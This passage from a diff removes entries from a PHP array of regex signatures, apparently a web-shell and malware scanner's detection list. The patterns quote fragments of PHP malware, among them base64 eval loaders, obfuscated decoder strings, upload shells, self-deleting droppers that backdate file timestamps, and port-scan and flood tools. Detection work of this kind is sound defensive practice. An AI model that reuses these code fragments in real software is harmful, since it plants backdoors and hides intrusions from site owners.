-      'label' => 'sample-specific line fragment',
-    ),
-    57 => 
-    array (
-      'pattern' => '/\\<\\?php eval\\(base64_decode\\(\'CiBnb3RvIFBlVGVZOyB6b2hOXzogZ290byBsQnBPcjsgZ290byBWTjNQeTsgVXpyZmg6IHRvMnhiOiBnb3RvIFc0WmhlOyBWTjNQeTogdXR5d1c6IG/',
-      'label' => 'source-file tail snippet',
-    ),
-    58 => 
-    array (
-      'pattern' => '/Plugin Name\\: Hermes[\\s\\S]{0,12000}\\$sshPorts \\= fastNonBlockingPortScan\\(\\$targetIP, \\$startPort, \\$endPort, 2, \\$concurrency\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    59 => 
-    array (
-      'pattern' => '/\\$▛ \\= "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; \\/\\/Pass\\: xleet[\\s\\S]{0,12000}eval\\(\\$o\\("CiRzdHQxID0gIlN5MUx6TkZRdDdkVDEwdXZLczFMenM4dEtFb3RMdFpJcjhyTVM4dEpMRWxGWWlVbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFGSlx4NjNVRlx4NjF/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    60 => 
-    array (
-      'pattern' => '/\\>
-    \\<title\\>PHP File Uploader\\<\\/title\\>
-\\<\\/head\\>
-\\<body\\>
-    \\<h2\\>Upload a File\\<\\/h2\\>
-    \\<form action\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    61 => 
-    array (
-      'pattern' => '/@set_time_limit\\(0\\);[\\s\\S]{0,12000}echo \\$tester\\-\\>runStressTest\\(\\$socketcount, \\$host, \\$port, \\$path, \\$method, \\$testType, true,\\$note\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    62 => 
-    array (
-      'pattern' => '/\\$Cyto \\= "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\\\\x42rNK85Pz\\\\x63gqLU4mLq\\\\x43\\\\x43\\\\x63lFqe\\\\x61m\\\\x63Snp\\\\x43\\\\x62np6Rq\\\\x41O0sSi3TUPHJr/',
-      'label' => 'source-file head snippet',
-    ),
-    63 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: WP Super Cache[\\s\\S]{0,12000}\\$qmhjw3080 \\= \\$vicjn5815\\[19\\]\\.\\$vicjn5815\\[23\\]\\.\\$vicjn5815\\[24\\]\\.\\$vicjn5815\\[1\\]\\.\\$vicjn5815\\[14\\]\\.\\$vicjn5815\\[75\\]\\.\\$vicjn5815\\[68\\]\\.\\$vicjn5815\\[53\\]\\.\\$vicjn58/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    64 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); function eGerl\\(\\$yJCsx\\) \\{ \\$VmURk \\= strlen\\(trim\\(\\$yJCsx\\)\\); \\$Umn88 \\= \'\'; for \\(\\$bJVuV \\= 0; \\$bJVuV \\< \\$VmURk; \\$bJVuV \\+\\= 2/',
-      'label' => 'source-file tail snippet',
-    ),
-    65 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'F6lYM\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    66 => 
-    array (
-      'pattern' => '/\\* This file is part of the Symfony package\\.[\\s\\S]{0,12000}\\* @throws TransportExceptionInterface on a network error or when the idle timeout is reached/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    67 => 
-    array (
-      'pattern' => '/\\$ytybnb2\\s+\\=\\s+eozmtr0\\(base64_decode\\(urldecode\\(\\$ytybnb2\\)\\),\\s+\\$icfvxq3\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    68 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6akB; \\$lv38F \\+\\= 2/',
-      'label' => 'source-file tail snippet',
-    ),
-    69 => 
-    array (
-      'pattern' => '/\\<\\?php @error_reporting\\(round\\(0\\)\\);@set_time_limit\\(round\\(0\\+150\\)\\);@ignore_user_abort\\(true\\);function abort\\(\\$name\\) \\{if\\(isset\\(\\$_GET\\[\'remove\'\\]\\)\\) \\{u/',
-      'label' => 'source-file tail snippet',
-    ),
-    70 => 
-    array (
-      'pattern' => '/\\$server \\= \\$_SERVER\\[\'SERVER_NAME\'\\];[\\s\\S]{0,12000}ec\\<span style\\="display\\:none;"\\>gki\\<\\/span\\>ho \'S\\<span style\\="display\\:none;"\\>pel\\<\\/span\\>ome er\\<span style\\="display\\:none;"\\>urv\\<\\/span\\>ror was occur/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    71 => 
-    array (
-      'pattern' => '/\\\\x0ctǏ\\\\x0bq\\!GF&i\\\\x0cqvX\\)JC83\\*_\\.\\\\x0bVǉ~T\\\\x0cp\\/DfXx\\/\\?ӓKu2L\'Wu Dܿk\\\\x0dqaVzۮS\\\\x0aSOD\\:s\\.ᄐS\\\\x24m\\\\x5c\\>\\[b\\!E\\*%7\\\\x7fM\\\\x24\\[Gg/',
-      'label' => 'source-file tail snippet',
-    ),
-    72 => 
-    array (
-      'pattern' => '/\\<\\?\\= htmlspecialchars\\(\\$_POST\\[\'cmd\'\\], ENT_QUOTES, \'UTF\\-8\'\\) \\?\\>[\\s\\S]{0,160}this\\.setSelectionRange\\(this\\.value\\.length, this\\.value\\.length\\);/',
-      'label' => 'sample-specific literal chain',
-    ),
-    73 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fwfxuzph\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$gpnzw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/',
-      'label' => 'source-file tail snippet',
-    ),
-    74 => 
-    array (
-      'pattern' => '/\\$method \\= \\$_SERVER\\[\'REQUEST_METHOD\'\\];[\\s\\S]{0,12000}if\\(\\$jfnbrsjfq\\)\\{echo \'error 403\';\\} else \\{echo \'error 404 \\: \' \\. \\$jfnbrsjfq;\\}/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    75 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$dvvycyhtmetns,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    76 => 
-    array (
-      'pattern' => '/\\<\\?php echo "SBfHHKaNed"; if \\(file_exists\\("\\.\\/class\\.rays\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.rays\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4BS1r/',
-      'label' => 'source-file tail snippet',
-    ),
-    77 => 
-    array (
-      'pattern' => '/\\<\\?php \\$cgetznt\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$vargnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    78 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gbvppz\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$upxtcmnct\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    79 => 
-    array (
-      'pattern' => '/\\<\\?php \\$utktfpmrkg\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$rukvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    80 => 
-    array (
-      'pattern' => '/\\<\\?php \\$cfbaxd\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$ccqtqdyg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    81 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}echo \'\\<html\\>\\<body\\>\\<script\\>\'\\.base64_decode\\(str_replace\\(\'\\.\', \'\', \'d2luZG\\.93LmxvY2F0aW9uLn\\.JlcGxhY2U\\=\'\\)\\)\\.\'\\("\'\\.\\$location\\.str_replace\\("\\\\\\\\", "\\\\\\\\\\\\\\\\/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    82 => 
-    array (
-      'pattern' => '/\\<\\?php echo "ezpCSWNdnd"; if \\(file_exists\\("\\.\\/embassy\\-list\\.php"\\)\\)\\{ touch\\("\\.\\/embassy\\-list\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*G/',
-      'label' => 'source-file tail snippet',
-    ),
-    83 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nwumz\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$gfyms\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    84 => 
-    array (
-      'pattern' => '/Lyp2bXJremFjd2ZzdW5wd2EqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    85 => 
-    array (
-      'pattern' => '/\\<\\?php \\$udxthmda\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$edbbtfkwt\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    86 => 
-    array (
-      'pattern' => '/\\<\\?php \\$s \\= eval\\(base64_decode\\("Ly9zZXRfdGltZV9saW1pdCAoIDY2NjAwMCApOw0KLy9AaWdub3JlX3VzZXJfYWJvcnQgKHRydWUpOw0KDQoNCmZ1bmN0aW9uIGlzQm90RGV0Z/',
-      'label' => 'source-file tail snippet',
-    ),
-    87 => 
-    array (
-      'pattern' => '/, DIRECTORY_SEPARATOR, \\$fname\\);
-\\$fname \\= str_replace\\([\\s\\S]{0,160}, DIRECTORY_SEPARATOR, \\$fname\\);
-
-\\$p \\= strpos\\(\\$data,/',
-      'label' => 'sample-specific literal chain',
-    ),
-    88 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ymsckxd\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$wbyrrudyk\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    89 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fwyqutxks\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$ytwfn\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    90 => 
-    array (
-      'pattern' => '/if\\(\\$jfnbrsjfq\\)\\{echo \'error 403\';\\} else \\{echo \'error 404 \\: \' \\. \\$jfnbrsjfq;\\}/',
-      'label' => 'source-file tail snippet',
-    ),
-    91 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mxmtxb\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$ensbst\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    92 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$_POST                    \\[\'r\'\\]      \\(                    \\$_POST             \\[\'d\'\\]            \\(                         \'\',                 /s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    93 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply          \\(\\$option, \\$win,                 array                         \\(\\$it\\)                      \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    94 => 
-    array (
-      'pattern' => '/\\<\\?php echo "czFKvsRnpu"; if \\(file_exists\\("\\.\\/init\\.partly\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.partly\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*xvW/',
-      'label' => 'source-file tail snippet',
-    ),
-    95 => 
-    array (
-      'pattern' => '/LypudW50ZHB5YXNwa3R1enYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    96 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kuqaqxts\\=str_ireplace\\("h","","hbhhhhahhhhhhshhehhhhh6hh4hhhh_hhhhdhhhhhhehhhhchhhhhohhhhdhhhhhehh"\\); \\$tatruuwx\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    97 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tgdaae\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$upfwxnmmn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    98 => 
-    array (
-      'pattern' => '/LypxbnhwZHlxciovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnJm/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    99 => 
-    array (
-      'pattern' => '/\\<\\?php echo "yYsKHeFWvB"; if \\(file_exists\\("\\.\\/watch_video\\.php"\\)\\)\\{ touch\\("\\.\\/watch_video\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Fww/',
-      'label' => 'source-file tail snippet',
-    ),
-    100 => 
-    array (
-      'pattern' => '/\\<\\?php echo "wRQubMhwDF"; if \\(file_exists\\("\\.\\/error_log\\.php"\\)\\)\\{ touch\\("\\.\\/error_log\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hmapcsZ/',
-      'label' => 'source-file tail snippet',
-    ),
-    101 => 
-    array (
-      'pattern' => '/Lyp3dnh3ZXdrcHhyYSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsv/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    102 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mtrgarydc\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$cdyzbeuhey\\="DQoJCUBlcnJvcl9/',
-      'label' => 'source-file tail snippet',
-    ),
-    103 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pfftakr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bvvkyz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    104 => 
-    array (
-      'pattern' => '/\\<\\?php \\$thmvz\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$htepc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    105 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xpbmtnx\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$zsrsbd\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    106 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vfrzbuu\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$csxuntq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    107 => 
-    array (
-      'pattern' => '/Lypybmdhbnl0d3J3dyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsv/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    108 => 
-    array (
-      'pattern' => '/\\<\\?php echo "hqwMEgSMcT"; if \\(file_exists\\("\\.\\/gutscheine\\.php"\\)\\)\\{ touch\\("\\.\\/gutscheine\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*UdqKu/',
-      'label' => 'source-file tail snippet',
-    ),
-    109 => 
-    array (
-      'pattern' => '/\\);\\$vppgxame\\=\\$xn\\(\\$tehat\\);user_error\\(\\$vppgxame,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    110 => 
-    array (
-      'pattern' => '/\\<\\?php echo "TzhvRRgxVW"; if \\(file_exists\\("\\.\\/changecurrency\\.php"\\)\\)\\{ touch\\("\\.\\/changecurrency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    111 => 
-    array (
-      'pattern' => '/\\<\\?php echo "qyrZCdMabn"; if \\(file_exists\\("\\.\\/moderate\\.php"\\)\\)\\{ touch\\("\\.\\/moderate\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HdUWty5se/',
-      'label' => 'source-file tail snippet',
-    ),
-    112 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gkaaaegnn\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$cfwxzey\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    113 => 
-    array (
-      'pattern' => '/\\<\\?php \\$cqvhmubftu\\=str_ireplace\\("w","","wwbwwawwwwwwswwwewww6wwww4wwwwww_wwwwdwwwwwwewwwcwwwowwwwwwdwwwwwew"\\); \\$dghvprk\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    114 => 
-    array (
-      'pattern' => '/\\<\\?php echo "DYYQYSFKUm"; if \\(file_exists\\("\\.\\/register2\\.php"\\)\\)\\{ touch\\("\\.\\/register2\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*565hAH5/',
-      'label' => 'source-file tail snippet',
-    ),
-    115 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bmrpr\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$ktmzcg\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    116 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xvuykgzevv\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$bxeqhmt\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    117 => 
-    array (
-      'pattern' => '/\\<\\?php echo "wXXUwWbYGA"; if \\(file_exists\\("\\.\\/loose_lib\\.php"\\)\\)\\{ touch\\("\\.\\/loose_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*QkGk95N/',
-      'label' => 'source-file tail snippet',
-    ),
-    118 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bsadpzugt\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$cbqzn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    119 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tdsgattt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$uqcqvh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    120 => 
-    array (
-      'pattern' => '/\\<\\?php echo "wUNcwuwZrH"; if \\(file_exists\\("\\.\\/archivo\\.php"\\)\\)\\{ touch\\("\\.\\/archivo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*FPR30EFu3sa/',
-      'label' => 'source-file tail snippet',
-    ),
-    121 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply           \\(\\$option, \\$win,     array                     \\(\\$it\\)             \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    122 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}define\\(\'PATH\', __DIR__\\)           ;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    123 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zrmerscsyv\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$ecmvpfbp\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    124 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gwnpbvu\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wqmxwdfs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    125 => 
-    array (
-      'pattern' => '/\\<\\?php echo "xhrTkbKDYD"; if \\(file_exists\\("\\.\\/resend_login\\.php"\\)\\)\\{ touch\\("\\.\\/resend_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*r/',
-      'label' => 'source-file tail snippet',
-    ),
-    126 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xqckedd\\=str_ireplace\\("m","","mmbmmmmammmmmmsmmmemmmm6mmmm4mmm_mmmmmmdmmmmemmmcmmmmmmommmdmmmemmm"\\); \\$nzbycsw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    127 => 
-    array (
-      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error                           \\(  \\$win_error, E_USER_ERROR\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    128 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ftrxmtk\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$dcusz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    129 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dteadkd\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$nxhaupqxmk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    130 => 
-    array (
-      'pattern' => '/\\<\\?php \\$crzkwb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rypxdutack\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    131 => 
-    array (
-      'pattern' => '/LypybXlucyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKmZjZnNo/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    132 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qdfgv\\=str_ireplace\\("y","","ybyyyayyyyysyyeyyyy6yyy4yyyyy_yyydyyeyyyycyyoyyydyyyeyy"\\); \\$mnzkyvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/',
-      'label' => 'source-file tail snippet',
-    ),
-    133 => 
-    array (
-      'pattern' => '/\\<\\?php echo "DernqCWXYx"; if \\(file_exists\\("\\.\\/api\\.rubber\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.rubber\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*P60fs/',
-      'label' => 'source-file tail snippet',
-    ),
-    134 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qsuqkzv\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$fwvgvnb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    135 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}usort                  \\( \\$b, \\$a          \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    136 => 
-    array (
-      'pattern' => '/\\);\\$gnncn\\=\\$heacccad\\(\\$shcas\\);user_error\\(\\$gnncn,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    137 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$phzvewn,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    138 => 
-    array (
-      'pattern' => '/Lyp3YmtlY2Z2c3pzZ2VleSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    139 => 
-    array (
